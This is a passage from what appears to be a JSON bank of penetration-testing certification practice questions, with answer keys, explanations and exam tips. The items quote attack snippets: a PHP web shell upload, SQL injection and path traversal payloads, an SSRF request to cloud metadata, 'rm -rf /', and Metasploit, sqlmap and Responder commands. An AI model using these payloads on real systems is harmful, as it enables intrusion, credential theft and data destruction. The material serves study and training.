        "Cross-site request forgery (CSRF) exploiting weak origin validation.",
        "Cross-origin resource sharing (CORS) vulnerabilities for API abuse.",
        "Reflected XSS due to insufficient content security policy (CSP)."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`ALLOW-FROM` in `X-Frame-Options` can be exploited for clickjacking if the specified domain (`example.com`) is compromised or malicious.",
      "examTip": "Clickjacking prevention = DENY or SAMEORIGIN. ALLOW-FROM is risky—avoid when possible."
    },
    {
      "id": 42,
      "question": "A penetration tester reviews the following response after submitting a serialized object to a web application:\n\n```\nException: java.io.InvalidClassException: com.app.User; local class incompatible: stream classdesc serialVersionUID = 1L, local class serialVersionUID = 2L\n```\n\nWhich vulnerability is MOST likely present?",
      "options": [
        "Java deserialization vulnerability leading to remote code execution (RCE).",
        "Insecure direct object reference (IDOR) due to improper object mapping.",
        "SQL injection via serialized payload manipulation.",
        "Cross-site scripting (XSS) through user-supplied data reflection."
      ],
      "correctAnswerIndex": 0,
      "explanation": "A `serialVersionUID` mismatch in serialized objects often indicates unsafe deserialization processes, potentially enabling RCE via crafted payloads.",
      "examTip": "Deserialization bugs = RCE opportunities. Always test custom serialization endpoints."
    },
    {
      "id": 43,
      "question": "Given the following Dockerfile:\n\n```\nFROM ubuntu:18.04\nRUN apt-get update && apt-get install -y openssh-server\nRUN echo 'root:password' | chpasswd\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n```\n\nWhich security misconfiguration MOST critically impacts the container's security posture?",
      "options": [
        "Hardcoded root credentials significantly increase the risk of container compromise.",
        "Lack of user namespace remapping exposes host resources to the container.",
        "Absence of a non-root user allows privilege escalation within the container.",
        "Running outdated Ubuntu images introduces known vulnerabilities."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hardcoded root credentials are a critical security flaw, offering attackers immediate access if the image is compromised or publicly accessible.",
      "examTip": "Never hardcode credentials in Dockerfiles—consider secrets management solutions."
    },
    {
      "id": 44,
      "question": "Analyze the following Wireshark packet capture snippet:\n\n```\nHypertext Transfer Protocol\n    GET /api/user?id=1%20OR%201=1 HTTP/1.1\n    Host: vulnerableapp.local\n```\n\nWhat is the MOST likely attack type observed in this capture?",
      "options": [
        "SQL injection exploiting insufficient input validation.",
        "Cross-site scripting (XSS) through URL parameter manipulation.",
        "Path traversal attack leveraging improper encoding.",
        "Server-side request forgery (SSRF) targeting backend services."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`1=1` in URL parameters is a classic SQL injection indicator, suggesting improper input sanitization at the backend.",
      "examTip": "SQLi signs in URLs? Always test with UNION-based and error-based payloads next."
    },
    {
      "id": 45,
      "question": "A penetration tester accesses AWS Lambda functions and discovers the following IAM policy attached:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\nWhich exploitation method MOST effectively escalates privileges in this scenario?",
      "options": [
        "Inject malicious code into Lambda functions to assume administrative roles.",
        "Leverage `iam:PassRole` to attach high-privilege roles to EC2 instances.",
        "Exploit `sts:AssumeRole` capabilities to pivot across AWS services.",
        "Enumerate S3 buckets and inject malicious objects for execution."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Full `*` access in IAM policies allows Lambda function modification, enabling privilege escalation through malicious code execution under elevated roles.",
      "examTip": "Wildcard IAM policies (`*:*`) = instant escalation paths. Lambda code injection is a top priority exploit."
    },
    {
      "id": 46,
      "question": "The following Metasploit output is observed:\n\n```\n[*] Meterpreter session 3 opened (192.168.1.10:4444 -> 192.168.1.25:51342)\n```\n\nWhich command should the tester execute NEXT to maintain persistent access after a reboot?",
      "options": [
        "run persistence -U -i 5 -p 4444 -r 192.168.1.10",
        "background && sessions -l",
        "run post/windows/gather/enum_logged_on_users",
        "migrate -N explorer.exe"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `run persistence` command installs a persistent payload that re-establishes the Meterpreter session after reboot, maintaining long-term access.",
      "examTip": "Persistence is key after initial access—don’t lose your foothold on reboot."
    },
    {
      "id": 47,
      "question": "Review the following Python code:\n\n```python\nimport jwt\npayload = {\"user\":\"admin\"}\nencoded = jwt.encode(payload, 'secret', algorithm='HS256')\nprint(encoded)\n```\n\nWhich attack would MOST effectively compromise this JWT implementation?",
      "options": [
        "Brute-forcing the weak 'secret' key to forge valid JWTs.",
        "Exploiting `alg: none` header manipulation to bypass signature checks.",
        "JWT confusion attack leveraging asymmetric and symmetric key mismatches.",
        "Replay attack by resending valid JWTs without expiration checks."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Using a weak signing secret (`'secret'`) enables attackers to brute-force the key, allowing them to create valid tokens and impersonate users.",
      "examTip": "JWT secrets must be strong—short or common secrets are trivial to crack."
    },
    {
      "id": 48,
      "question": "The following BloodHound output reveals:\n\n```\nEdge: AddMember\nSource: svc_web\nTarget: DOMAIN\\Domain Admins\n```\n\nWhich exploitation path is MOST direct for escalating privileges?",
      "options": [
        "Add svc_web to the Domain Admins group, granting full domain privileges.",
        "Kerberoast svc_web’s SPN for offline hash cracking attempts.",
        "Abuse ACLs to inject malicious certificates for authentication bypass.",
        "Conduct a DCShadow attack using the svc_web account."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `AddMember` permission allows the attacker to add the `svc_web` account directly to Domain Admins, immediately escalating privileges.",
      "examTip": "AddMember edges in BloodHound = direct DA access. Exploit immediately for full domain control."
    },
    {
      "id": 49,
      "question": "Analyze the following packet capture:\n\n```\nPOST /api/upload HTTP/1.1\nHost: vulnerableapp.local\nContent-Type: multipart/form-data; boundary=---12345\n\n-----12345\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n-----12345--\n```\n\nWhich vulnerability MOST likely led to successful exploitation?",
      "options": [
        "Unrestricted file upload enabling remote code execution (RCE).",
        "Server-side template injection (SSTI) via unsafe PHP handling.",
        "Path traversal due to improper file path validation.",
        "Insecure deserialization leading to PHP object injection."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Uploading a PHP web shell and executing system commands indicates an unrestricted file upload vulnerability, allowing RCE.",
      "examTip": "Always sanitize file uploads—web shells are a common and dangerous vector."
    },
    {
      "id": 50,
      "question": "A tester uses the following command:\n\n```\nresponder -I eth0 -wrf\n```\n\nWhat is the PRIMARY purpose of this action during a penetration test?",
      "options": [
        "Capture NTLMv2 hashes from SMB, HTTP, and LDAP requests for offline cracking.",
        "Perform LLMNR and NetBIOS poisoning to redirect victim traffic.",
        "Automatically relay SMB authentication attempts for lateral movement.",
        "Spoof DNS responses to reroute network traffic to malicious endpoints."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Responder with `-wrf` captures NTLMv2 hashes from multiple protocols, which can be cracked offline for credential harvesting and lateral movement.",
      "examTip": "NTLMv2 hashes + Responder = fast track to lateral movement. Always test for weak passwords offline."
    },
    {
      "id": 51,
      "question": "During a social engineering assessment, a tester sends an email with a link to `http://companyportal.login-reset.com`. What attack is being performed?",
      "options": [
        "Spearphishing through domain typosquatting to harvest credentials.",
        "Whaling targeting executives via fake login portals.",
        "Credential stuffing attack leveraging previously leaked passwords.",
        "Business Email Compromise (BEC) aiming for financial fraud."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The URL closely resembles a legitimate domain, indicating a typosquatting phishing attempt aimed at stealing user credentials.",
      "examTip": "Phishing + typosquatting = effective credential harvesting. Always verify domain authenticity."
    },
    {
      "id": 52,
      "question": "A penetration tester discovers the following HTTP header:\n\n```\nAccess-Control-Allow-Origin: *\n```\n\nWhat risk does this configuration MOST likely introduce?",
      "options": [
        "Cross-origin resource sharing (CORS) vulnerability enabling API abuse.",
        "Cross-site scripting (XSS) via reflected JavaScript payloads.",
        "Cross-site request forgery (CSRF) due to insufficient origin validation.",
        "Clickjacking attacks through improper frame policy configurations."
      ],
      "correctAnswerIndex": 0,
      "explanation": "A wildcard (`*`) in the `Access-Control-Allow-Origin` header allows any origin to access the API, potentially enabling malicious cross-origin interactions.",
      "examTip": "CORS misconfigurations = API abuse risk. Always limit origins to trusted domains."
    },
    {
      "id": 53,
      "question": "Analyze the following Kubernetes configuration:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: insecure-pod\nspec:\n  containers:\n  - name: app\n    image: app:v1\n    securityContext:\n      runAsUser: 0\n```\n\nWhat security risk is MOST significant in this configuration?",
      "options": [
        "Running the container as the root user, enabling easy container breakout.",
        "Exposing the pod to lateral movement due to network misconfigurations.",
        "Allowing privilege escalation via hostPath mounts.",
        "Granting excessive capabilities due to default seccomp profiles."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`runAsUser: 0` runs the container as root, increasing the risk of container escape and host-level compromise.",
      "examTip": "Root in containers = big red flag. Always define non-root users for pods."
    },
    {
      "id": 54,
      "question": "A penetration tester analyzes the following AWS CLI output:\n\n```\n{\n    \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n    \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n    \"Token\": \"...\",\n    \"Expiration\": \"2025-12-24T16:00:00Z\"\n}\n```\n\nWhat is the MOST effective next step to escalate privileges?",
      "options": [
        "Use Pacu to test privilege escalation modules for IAM role assumption.",
        "Attempt to list all S3 buckets using the AWS CLI with captured credentials.",
        "Invoke `sts:AssumeRole` calls for potential privilege escalation.",
        "Deploy Lambda functions under compromised credentials for code execution."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pacu can automate IAM privilege escalation checks, providing an efficient path to broader AWS account compromise.",
      "examTip": "AWS metadata ≠ final goal. Pacu accelerates privilege escalation validation."
    },
    {
      "id": 55,
      "question": "Examine the following Kubernetes role binding:\n\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: admin-access\nsubjects:\n- kind: User\n  name: attacker\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n```\n\nWhich risk does this MOST critically represent?",
      "options": [
        "Full cluster compromise due to cluster-admin privileges assigned to attacker.",
        "Cross-namespace privilege escalation via improper RoleBinding scope.",
        "Service account token leakage allowing lateral movement in the cluster.",
        "Exposed Kubernetes API enabling direct pod creation by attacker."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Assigning `cluster-admin` privileges gives full control over the Kubernetes cluster, enabling complete takeover.",
      "examTip": "Cluster-admin bindings = full cluster domination. Always audit RoleBindings carefully."
    },
    {
      "id": 56,
      "question": "Given the following Wireshark capture snippet:\n\n```\nPOST /api/login HTTP/1.1\nHost: vulnerable.local\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n```\n\nWhat is the MOST likely exploitation path for the captured token?",
      "options": [
        "JWT brute-force attack targeting weak HMAC secrets.",
        "Session hijacking by replaying the bearer token in subsequent requests.",
        "CSRF exploiting token reuse without proper validation.",
        "Token swapping attack by manipulating JWT headers."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Bearer tokens can be replayed if not bound to specific contexts (e.g., IP address), enabling session hijacking.",
      "examTip": "Bearer tokens = sensitive. Implement context-bound validations to prevent replay attacks."
    },
    {
      "id": 57,
      "question": "Analyze the following SQL injection payload:\n\n```\n' UNION SELECT null, password FROM users; -- \n```\n\nWhich mitigation MOST effectively addresses this vulnerability?",
      "options": [
        "Implement prepared statements with parameterized queries.",
        "Configure a WAF with SQL injection signatures and block rules.",
        "Apply input validation to sanitize user-supplied data.",
        "Restrict database user privileges to minimize impact of injection."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Prepared statements prevent SQL injection by separating query logic from user input, rendering injection attempts ineffective.",
      "examTip": "SQL injection prevention = code-level defenses. Parameterization is key."
    },
    {
      "id": 58,
      "question": "A tester intercepts the following HTTP request:\n\n```\nGET /api/resource?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: vulnerableapp.local\n```\n\nWhich attack technique does this MOST likely represent?",
      "options": [
        "Server-side request forgery (SSRF) targeting cloud instance metadata.",
        "Local file inclusion (LFI) by abusing server-side file retrieval functions.",
        "Open redirect vulnerability enabling phishing attacks.",
        "DNS rebinding attack to access restricted internal services."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Accessing the AWS instance metadata endpoint (`169.254.169.254`) via a URL parameter suggests an SSRF attempt aimed at harvesting cloud credentials.",
      "examTip": "SSRF to metadata endpoints = cloud creds theft. Always validate outbound requests."
    },
    {
      "id": 59,
      "question": "While analyzing BloodHound output, the following edge is discovered:\n\n```\nEdge: GenericWrite\nSource: svc_backup\nTarget: DOMAIN\\Domain Controllers\n```\n\nWhat is the MOST effective exploitation technique in this scenario?",
      "options": [
        "Modify group memberships for domain dominance via DCSync attacks.",
        "Inject malicious scripts into GPOs for widespread lateral movement.",
        "Perform ACL abuse to push malicious Kerberos tickets.",
        "Initiate DCShadow attacks to manipulate domain replication."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`GenericWrite` access on Domain Controllers allows manipulation of group memberships, paving the way for DCSync attacks and domain dominance.",
      "examTip": "GenericWrite edges + DCSync = quick route to domain admin."
    },
    {
      "id": 60,
      "question": "The following command is executed during a wireless penetration test:\n\n```\nairmon-ng start wlan0\n```\n\nWhat is the PRIMARY objective of this action?",
      "options": [
        "Enable monitor mode on the wireless interface for packet capture.",
        "Initiate deauthentication attacks to capture WPA handshakes.",
        "Launch beacon flood attacks to disrupt wireless connectivity.",
        "Perform rogue access point creation for man-in-the-middle attacks."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`airmon-ng start wlan0` places the wireless card into monitor mode, allowing passive packet capture required for further wireless attacks.",
      "examTip": "Monitor mode = wireless reconnaissance foundation. Always start here before attacks."
    },
    {
      "id": 61,
      "question": "A penetration tester uses the following Metasploit module:\n\n```\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nrun\n```\n\nWhich vulnerability is being exploited in this scenario?",
      "options": [
        "SMBv1 vulnerability (EternalBlue) leading to remote code execution (RCE).",
        "SMB signing bypass allowing NTLM relay attacks.",
        "SMB share misconfiguration enabling unauthorized file access.",
        "SMB NULL session exploitation for sensitive information retrieval."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `ms17_010_eternalblue` Metasploit module exploits the SMBv1 vulnerability known as EternalBlue, leading to RCE on vulnerable systems.",
      "examTip": "EternalBlue = classic SMBv1 RCE. Patch MS17-010 to mitigate immediately."
    },
    {
      "id": 62,
      "question": "Review the following Python code snippet:\n\n```python\nimport os\nos.system('rm -rf /')\n```\n\nWhat category of vulnerability does this MOST likely represent if user input controls it?",
      "options": [
        "Command injection allowing arbitrary code execution.",
        "Insecure deserialization enabling unintended command execution.",
        "Path traversal exposing unauthorized file deletion capabilities.",
        "Cross-site scripting (XSS) via unsanitized user inputs."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`os.system()` with user-controlled input enables command injection, potentially allowing attackers to execute arbitrary system commands.",
      "examTip": "os.system() with user input? High-risk command injection vector. Always sanitize inputs."
    },
    {
      "id": 63,
      "question": "A tester runs the following SQLMap command:\n\n```\nsqlmap -u \"http://target.local/login.php?user=admin\" --risk=3 --level=5 --dump\n```\n\nWhat is the PRIMARY purpose of the `--risk=3 --level=5` flags?",
      "options": [
        "Increase the depth and aggressiveness of SQL injection tests to find less obvious vulnerabilities.",
        "Enable authentication bypass attempts through advanced payloads.",
        "Focus on time-based SQL injection vectors for slow-responding databases.",
        "Restrict enumeration to critical database tables to reduce false positives."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`--risk=3` and `--level=5` increase SQLMap’s testing intensity, exploring deeper and potentially more intrusive payloads to uncover hidden vulnerabilities.",
      "examTip": "Higher risk/level = deeper scanning. Use with caution—may impact target systems."
    },
    {
      "id": 64,
      "question": "Given the following HTTP response:\n\n```\nHTTP/1.1 200 OK\nSet-Cookie: PHPSESSID=abc123; path=/; HttpOnly\n```\n\nWhich security risk persists despite the `HttpOnly` flag?",
      "options": [
        "Cross-site request forgery (CSRF) because `HttpOnly` does not prevent CSRF attacks.",
        "Session hijacking via client-side script access to cookies.",
        "Cross-site scripting (XSS) due to lack of Content-Security-Policy (CSP).",
        "Clickjacking as there are no frame busting headers present."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`HttpOnly` prevents JavaScript from accessing cookies but does not mitigate CSRF attacks, which rely on sending authenticated requests.",
      "examTip": "`HttpOnly` ≠ CSRF protection. CSRF tokens or same-site cookies are required."
    },
    {
      "id": 65,
      "question": "A penetration tester identifies the following entry in a `.env` file on a web server:\n\n```\nSECRET_KEY=supersecret123\n```\n\nWhat is the MOST critical risk introduced by this discovery?",
      "options": [
        "Application signing key compromise, enabling JWT forgery and session hijacking.",
        "Credential leakage allowing unauthorized access to backend APIs.",
        "Exposure of database passwords stored in environment variables.",
        "Privilege escalation through hardcoded SSH private key retrieval."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Exposed `SECRET_KEY` values can be used to forge JWT tokens if the application uses them for signing, leading to authentication bypass and session hijacking.",
      "examTip": "Secrets in `.env` files = big risk. Always secure environment configurations and rotate compromised keys."
    },
    {
      "id": 66,
      "question": "A penetration tester runs the following command:\n\n```\nkubectl exec -it pod-name -- /bin/sh\n```\n\nWhat is the PRIMARY risk if this action is successful on a misconfigured pod?",
      "options": [
        "Potential container escape leading to host-level compromise.",
        "Privilege escalation through Kubernetes API token theft.",
        "Exposure of sensitive secrets mounted in the pod’s environment.",
        "Access to Kubernetes control plane via kubelet impersonation."
      ],
      "correctAnswerIndex": 0,
      "explanation": "If the pod runs with elevated privileges, successful shell access could enable attackers to escape the container and compromise the host.",
      "examTip": "Interactive pod shells? Always check for hostPath mounts—container escapes await."
    },
    {
      "id": 67,
      "question": "Examine the following Metasploit module usage:\n\n```\nuse exploit/linux/samba/is_known_pipename\nset RHOSTS 192.168.1.55\nrun\n```\n\nWhich vulnerability does this MOST likely exploit?",
      "options": [
        "Samba remote code execution (CVE-2017-7494).",
        "SMB signing bypass enabling relay attacks.",
        "Samba misconfiguration allowing unauthorized share access.",
        "SMBv1 vulnerability similar to EternalBlue."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `is_known_pipename` module targets the Samba RCE vulnerability CVE-2017-7494, enabling arbitrary code execution.",
      "examTip": "CVE-2017-7494 = Samba’s EternalBlue. RCE on port 445—always check old Samba versions."
    },
    {
      "id": 68,
      "question": "Analyze the following Kerberos capture snippet:\n\n```\nAS-REQ cname: user@domain.local sname: krbtgt/domain.local\nAS-REP enc-part: [RC4-HMAC]\n```\n\nWhat attack does this MOST likely indicate?",
      "options": [
        "AS-REP roasting exploiting users without pre-authentication.",
        "Pass-the-Ticket (PtT) attack using stolen TGTs.",
        "Kerberoasting targeting service principal names (SPNs).",
        "Overpass-the-Hash for lateral movement in Active Directory."
      ],
      "correctAnswerIndex": 0,
      "explanation": "AS-REP roasting involves extracting RC4-HMAC encrypted data for offline cracking when pre-authentication is not required.",
      "examTip": "AS-REP roast = no pre-auth users. Quick path to plaintext passwords offline."
    },
    {
      "id": 69,
      "question": "A tester intercepts the following HTTP request:\n\n```\nGET /api/user?file=../../../../etc/shadow HTTP/1.1\nHost: vulnerableapp.local\n```\n\nWhich vulnerability does this MOST likely represent?",
      "options": [
        "Directory traversal allowing unauthorized file access.",
        "Remote file inclusion (RFI) enabling server-side code execution.",
        "Insecure direct object reference (IDOR) exposing sensitive data.",
        "Server-side request forgery (SSRF) targeting internal resources."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `../../` pattern indicates directory traversal, aiming to access sensitive files like `/etc/shadow`.",
      "examTip": "Directory traversal = `../` in URLs. Validate and sanitize file paths."
    },
    {
      "id": 70,
      "question": "Review this AWS IAM policy:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"iam:PassRole\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\nWhich exploitation technique does this MOST likely enable?",
      "options": [
        "Privilege escalation by passing high-privilege roles to compute instances.",
        "Lateral movement through cross-account role assumption.",
        "Exploitation of Lambda functions for code execution under elevated permissions.",
        "Data exfiltration by granting S3 bucket access across regions."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`iam:PassRole` without restrictions allows attackers to attach privileged roles to services like EC2, escalating privileges.",
      "examTip": "`PassRole` permissions = AWS escalation danger. Lock them down with conditions."
    },
    {
      "id": 71,
      "question": "A tester executes the following:\n\n```\nnmap -sV -p- target.local\n```\n\nWhat is the PRIMARY purpose of the `-p-` option in this context?",
      "options": [
        "Scan all 65,535 TCP ports to identify potentially overlooked services.",
        "Conduct aggressive version detection on default service ports.",
        "Perform a stealth SYN scan across all open ports.",
        "Enable OS fingerprinting for all responsive hosts."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`-p-` instructs Nmap to scan all TCP ports, ensuring no services running on non-default ports are missed.",
      "examTip": "`-p-` = full port scan. Essential when services may hide on non-standard ports."
    },
    {
      "id": 72,
      "question": "Analyze this SQLMap command:\n\n```\nsqlmap -u \"http://target.local/page.php?id=1\" --os-shell\n```\n\nWhat is the PRIMARY goal of the `--os-shell` option?",
      "options": [
        "Obtain a command shell on the underlying operating system via SQL injection.",
        "Dump database tables containing sensitive user information.",
        "Enumerate backend database version and available schemas.",
        "Test for blind SQL injection vulnerabilities with time-based payloads."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`--os-shell` attempts to escalate SQL injection to OS-level command execution, providing direct system access.",
      "examTip": "`--os-shell` = direct RCE via SQLi. High-impact exploitation method."
    },
    {
      "id": 73,
      "question": "The following HTTP response header is observed:\n\n```\nAccess-Control-Allow-Origin: *\n```\n\nWhich security implication is MOST critical in this configuration?",
      "options": [
        "Cross-origin resource sharing (CORS) vulnerability enabling unauthorized API access.",
        "Cross-site request forgery (CSRF) due to lack of origin validation.",
        "Clickjacking via unrestricted framing from malicious domains.",
        "Cross-site scripting (XSS) via reflective parameters in API responses."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The wildcard (`*`) in CORS headers allows any origin access, potentially enabling malicious websites to interact with the API.",
      "examTip": "CORS misconfigs = easy API abuse. Always define strict origin policies."
    },
    {
      "id": 74,
      "question": "While conducting a wireless penetration test, the tester executes:\n\n```\naireplay-ng --deauth 100 -a 00:11:22:33:44:55 wlan0\n```\n\nWhat is the PRIMARY objective of this action?",
      "options": [
        "Force clients to disconnect to capture WPA/WPA2 handshakes.",
        "Flood the network with deauthentication frames to cause DoS.",
        "Crack the WPA2 pre-shared key using brute-force techniques.",
        "Exploit WPS vulnerabilities for rapid key retrieval."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Deauthentication attacks force clients to reconnect, allowing handshake capture for subsequent key cracking.",
      "examTip": "Deauth attack = handshake capture step. Essential before WPA2 brute force."
    },
    {
      "id": 75,
      "question": "The following BloodHound finding is noted:\n\n```\nEdge: WriteOwner\nSource: svc_account\nTarget: DOMAIN\\Domain Admins\n```\n\nWhich exploitation technique MOST directly leads to domain admin privileges?",
      "options": [
        "Modify object ownership to add svc_account to Domain Admins.",
        "Perform ACL abuse for Kerberos ticket manipulation.",
        "Initiate DCShadow attacks via ownership transfer.",
        "Exploit unconstrained delegation for lateral movement."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`WriteOwner` permissions allow attackers to change object ownership, enabling privilege escalation by adding accounts to privileged groups.",
      "examTip": "WriteOwner edges = direct privilege jumps. Domain Admins await with a single step."
    },
    {
      "id": 76,
      "question": "A penetration tester runs the following command:\n\n```\nnc -nv 192.168.1.100 80\n```\n\nWhat is the PRIMARY purpose of this action?",
      "options": [
        "Check for banner information on port 80 via Netcat for service identification.",
        "Establish a reverse shell on port 80 for stealthy communication.",
        "Create a persistent listener for incoming HTTP connections.",
        "Perform an HTTP GET request to enumerate web server directories."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`nc -nv <IP> <port>` connects to the specified port and can reveal service banners for reconnaissance.",
      "examTip": "Netcat + port probe = quick service fingerprinting. Useful pre-exploitation step."
    },
    {
      "id": 77,
      "question": "Examine the following Python code:\n\n```python\nimport hashlib\npassword = 'password123'\nsalt = 'abc123'\nhash = hashlib.md5((password + salt).encode()).hexdigest()\nprint(hash)\n```\n\nWhat is the MOST significant security concern with this implementation?",
      "options": [
        "Usage of MD5 hashing algorithm, which is vulnerable to collision attacks.",
        "Weak salting method allowing predictable hash outputs.",
        "Lack of key stretching making brute-force attacks feasible.",
        "Absence of SHA-256 or stronger hash functions increasing collision risk."
      ],
      "correctAnswerIndex": 0,
      "explanation": "MD5 is cryptographically broken and vulnerable to collisions, making it unsuitable for secure password hashing.",
      "examTip": "MD5 for passwords? Always upgrade to bcrypt, PBKDF2, or Argon2 for secure hashing."
    },
    {
      "id": 78,
      "question": "A penetration tester analyzes the following Python snippet:\n\n```python\nimport jwt\npayload = {\"user\":\"admin\"}\nencoded = jwt.encode(payload, 'mysecret', algorithm='HS256')\nprint(encoded)\n```\n\nWhich attack is MOST likely to succeed against this implementation?",
      "options": [
        "Brute-force attack on the weak signing secret to forge admin tokens.",
        "JWT confusion attack leveraging asymmetric key misconfiguration.",
        "Replay attack by resending previously captured JWTs.",
        "Cross-site scripting (XSS) through JWT payload manipulation."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of a weak secret (`mysecret`) makes brute-force attacks feasible, allowing attackers to forge valid tokens.",
      "examTip": "Weak JWT secrets = easy forgery. Always use strong, complex secrets for token signing."
    },
    {
      "id": 79,
      "question": "The following output is captured during packet analysis:\n\n```\nKerberos AS-REP enc-part: RC4-HMAC\ncname: svc_admin@domain.local\n```\n\nWhich technique would MOST likely exploit this scenario?",
      "options": [
        "AS-REP roasting for offline password cracking.",
        "Pass-the-Ticket (PtT) attack leveraging stolen TGTs.",
        "Kerberoasting to crack service principal credentials.",
        "Overpass-the-Hash attack for domain controller access."
      ],
      "correctAnswerIndex": 0,
      "explanation": "AS-REP roasting allows attackers to extract encrypted ticket responses (RC4-HMAC) for offline cracking when pre-authentication is disabled.",
      "examTip": "RC4-HMAC + no pre-auth? AS-REP roasting is your path to plaintext passwords."
    },
    {
      "id": 80,
      "question": "A tester runs the following Metasploit module:\n\n```\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.25\nrun\n```\n\nWhich vulnerability is being exploited here?",
      "options": [
        "vsFTPd v2.3.4 backdoor vulnerability leading to root shell access.",
        "ProFTPD backdoor vulnerability enabling unauthorized file access.",
        "OpenSSH misconfiguration leading to unauthorized shell access.",
        "Anonymous FTP login vulnerability for directory traversal attacks."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `vsftpd_234_backdoor` module exploits a malicious backdoor in vsFTPd v2.3.4 that spawns a root shell on successful connection.",
      "examTip": "vsFTPd 2.3.4 = notorious backdoor. Always check FTP banners for this version."
    },
    {
      "id": 81,
      "question": "Examine the following Docker configuration:\n\n```dockerfile\nFROM ubuntu:18.04\nRUN apt-get update && apt-get install -y sudo\nRUN useradd -m user && echo \"user:userpass\" | chpasswd && adduser user sudo\nCMD [\"/bin/bash\"]\n```\n\nWhat is the MOST critical risk introduced by this configuration?",
      "options": [
        "Privilege escalation due to unrestricted sudo access inside the container.",
        "Host OS compromise via Docker socket exposure.",
        "Container escape through shared volumes with the host.",
        "Arbitrary code execution from user context with default credentials."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Granting sudo privileges without restrictions allows attackers to escalate privileges inside the container, potentially leading to host compromise.",
      "examTip": "Sudo in containers = host compromise risk. Always apply principle of least privilege."
    },
    {
      "id": 82,
      "question": "A penetration tester identifies the following HTTP header during analysis:\n\n```\nAccess-Control-Allow-Origin: *\n```\n\nWhat security implication does this configuration MOST likely introduce?",
      "options": [
        "Cross-origin resource sharing (CORS) vulnerability enabling unauthorized access to APIs.",
        "Cross-site request forgery (CSRF) vulnerability due to lack of proper origin checks.",
        "Clickjacking risks from improper frame policy configurations.",
        "Cross-site scripting (XSS) due to unsanitized API responses."
      ],
      "correctAnswerIndex": 0,
      "explanation": "A wildcard CORS policy (`*`) allows any origin to access resources, potentially enabling malicious sites to perform unauthorized actions via API calls.",
      "examTip": "CORS misconfigurations = open APIs for attackers. Limit origins strictly."
    },
    {
      "id": 83,
      "question": "A tester executes the following:\n\n```\nairmon-ng start wlan0\nairodump-ng wlan0mon\n```\n\nWhat is the PRIMARY objective of these commands during a wireless penetration test?",
      "options": [
        "Enable monitor mode and capture wireless traffic for handshake analysis.",
        "Launch deauthentication attacks to force client reconnections.",
        "Brute-force WPA2 pre-shared keys using captured handshakes.",
        "Intercept Wi-Fi Protected Setup (WPS) PIN exchanges for key retrieval."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`airmon-ng start` enables monitor mode, while `airodump-ng` captures wireless traffic and WPA/WPA2 handshakes.",
      "examTip": "Monitor + Airodump = wireless reconnaissance base for handshake capture."
    },
    {
      "id": 84,
      "question": "A tester uses the following Burp Suite Intruder payload:\n\n```\nPOST /login HTTP/1.1\nHost: target.local\nusername=admin&password=admin123\n```\n\nWhich attack is MOST likely being performed?",
      "options": [
        "Credential brute-force attack to discover valid username-password pairs.",
        "Session fixation attack through repeated login attempts.",
        "SQL injection via authentication fields for database access.",
        "Cross-site request forgery (CSRF) exploiting weak authentication controls."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Burp Suite Intruder in this context attempts multiple username-password combinations to brute-force login credentials.",
      "examTip": "Intruder + auth forms = brute-force territory. Always monitor rate limits."
    },
    {
      "id": 85,
      "question": "While performing an IoT penetration test, a tester identifies an MQTT broker running without authentication. What is the MOST critical exploitation risk?",
      "options": [
